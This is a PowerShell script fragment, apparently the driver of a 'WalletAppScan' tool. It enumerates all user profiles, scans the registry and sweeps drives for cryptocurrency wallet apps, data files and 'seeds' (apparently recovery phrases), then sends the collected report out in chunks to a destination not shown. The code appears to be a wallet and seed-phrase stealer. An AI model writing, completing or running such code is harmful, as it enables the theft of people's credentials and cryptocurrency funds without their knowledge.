Write-Log '========== WalletAppScan run started =========='

$Script:UserProfiles = Get-RealUserProfiles
Write-Log "User profiles: $((@($Script:UserProfiles).Name) -join ', ')"

$Script:RootsUsed = Get-ScanRoots
Write-Log "Scan roots: $((@($Script:RootsUsed) -join ', '))"

try { Invoke-RegistryAppScan } catch { Add-Error "Installed-programs scan failed: $($_.Exception.Message)" }
try { Invoke-DriveSweep } catch { Add-Error "Drive sweep failed: $($_.Exception.Message)" }

# ---- One consolidated report ----
$lines = Build-ReportLines
$chunksSent = Send-ReportChunks -Lines $lines
$dur = [int]((Get-Date) - $scanStart).TotalSeconds
Write-Log "Report sent ($chunksSent chunk(s)). Duration: ${dur}s. Apps: $($Script:Apps.Count), folders: $($Script:Folders.Count), data files: $($Script:DataFiles.Count), seeds: $($Script:Seeds.Count)"
Write-Console "Done in ${dur}s. Report chunks sent: $chunksSent" 'Green'

exit 0
